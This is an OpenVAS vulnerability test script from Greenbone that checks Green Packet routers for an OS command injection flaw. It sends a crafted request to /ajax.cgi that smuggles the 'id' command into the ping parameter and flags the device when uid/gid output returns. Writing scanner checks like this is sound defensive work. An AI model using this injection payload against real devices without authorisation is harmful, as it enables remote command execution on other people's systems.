###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_greenpacket_router_rce_vuln.nasl 11025 2018-08-17 08:27:37Z cfischer $
#
# Green Packet Routers OS Command Injection Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106986");
  script_version("$Revision: 11025 $");
  script_tag(name:"last_modification", value:"$Date: 2018-08-17 10:27:37 +0200 (Fri, 17 Aug 2018) $");
  script_tag(name:"creation_date", value:"2017-07-26 17:10:09 +0700 (Wed, 26 Jul 2017)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Green Packet Routers OS Command Injection Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("lighttpd/banner");

  script_tag(name:"summary", value:"Green Packet Routers are prone to an arbitrary OS command injection
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"https://iscouncil.blogspot.com/2017/07/command-injection-in-green-packet-dx.html");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default: 80);

url = "/ajax.cgi?action=tag_ipPing&pip=127.0.0.1%26id%26&cache=false";

req = http_get_req(port: port, url: url, add_headers: make_array("X-Requested-With", "XMLHttpRequest",
                                                                 "Cookie", "page=manage_dping.php"));
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "HTTP/1\.[0-1] 200" && res =~ "uid=[0-9]+.*gid=[0-9]+") {
  uid = eregmatch(pattern: "(uid=[0-9]+.*gid=[0-9]+.*\))", string: res);

  report = "It was possible to execute the 'id' command.\n\nResult: " + uid[1] + "\n";

  security_message(port: port, data: report);
  exit(0);
}

exit(0);
